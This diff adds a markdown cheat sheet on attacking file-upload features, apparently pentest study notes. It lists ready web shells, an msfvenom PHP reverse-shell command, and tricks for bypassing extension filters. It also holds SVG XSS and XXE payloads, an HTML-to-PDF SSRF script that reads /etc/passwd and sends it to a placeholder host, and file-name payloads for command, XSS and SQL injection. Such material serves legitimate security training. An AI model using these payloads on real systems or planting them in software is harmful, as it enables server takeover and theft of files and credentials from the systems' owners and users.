@@ -1,0 +1,170 @@
+
+
+## Web Shells
+
+| **Web Shell**   | **Description**   |
+| --------------|-------------------|
+| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
+| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
+| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
+| `<% eval request('cmd') %>` | Basic ASP Web Shell |
+| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
+| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
+| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
+| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |
+
+## Bypasses
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| **Client-Side Bypass** |
+| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
+| **Blacklist Bypass** |
+| `shell.phtml` | Uncommon Extension |
+| `shell.pHp` | Case Manipulation |
+| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
+| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
+| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
+| **Whitelist Bypass** |
+| `shell.jpg.php` | Double Extension |
+| `shell.php.jpg` | Reverse Double Extension |
+| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
+| **Content/Type Bypass** |
+| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
+| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
+| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |
+
+## Limited Uploads
+
+| **Potential Attack**   | **File Types** |
+| --------------|-------------------|
+| `XSS` | HTML, JS, SVG, GIF |
+| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
+| `DoS` | ZIP, JPG, PNG |
+
+
+### XSS in SVG 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert("window.origin");</script>
+</svg>
+```
+
+
+
+### XXE in SVG 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+
+### SSRF in  HTML  to PDF  generator
+
+```html
+<html>
+    <body>
+        <b>Exfiltration via Blind SSRF</b>
+        <script>
+        var readfile = new XMLHttpRequest(); 
+        var exfil = new XMLHttpRequest(); 
+        readfile.open("GET","file:///etc/passwd", true); 
+        readfile.send();
+        readfile.onload = function() {
+            if (readfile.readyState === 4) {
+                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
+                exfil.open("GET", url, true);
+                exfil.send();
+            }
+        }
+        readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html>
+```
+
+
+## Injections in File Name
+
+
+-A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page.
+
+
+###### Command injection
+-if we name a file file$(whoami).jpg or file \`whoami\`.jpg or file.jpg||whoami  
+-then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp),
+
+
+###### XSS 
+-payload in the file name (e.g. <script>alert(window.origin);</script>), which would get executed on the target's machine if the file name is displayed to them.
+
+###### SQL injection
+-We may also inject an SQL query in the file name (e.g. file';select+sleep(5);--.jpg), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
+
+
+
+
+## Upload Directory Disclosure
+
+###### fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE)
+
+
+###### Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved
+
+
+######  disclose the uploads directory is through forcing error messages
+-uploading a file with a name that already exists 
+-sending two identical requests simultaneously
+-uploading a file with an overly long name (e.g., 5,000 characters)
+
+
+
+
+## Overriding the server configuration
+
+
+-Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.
+
+-Apache server will execute PHP files requested by a client, developers might have to add the following directives to their /etc/apache2/apache2.conf file
+
+
+
+-Apache servers, for example, will load a directory-specific configuration from a file called .htaccess
+
+```
+LoadModule php_module /usr/lib/apache2/modules/libphp.so
+AddType application/x-httpd-php .php
+```
+
+
+
+-IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
+
+```
+<staticContent>
+    <mimeMap fileExtension=".json" mimeType="application/json" />
+</staticContent>
+```
+
+
+
+
+## Exploiting file upload race conditions
+
+-Modern frameworks don't upload files directly to their intended destination on the filesystem.
+
+-Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files.
+
+-They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.
+
+-That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions -that enable an attacker to completely bypass even the most robust validation.
+
+-some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation.
+-This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware.
+-This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.
+
+
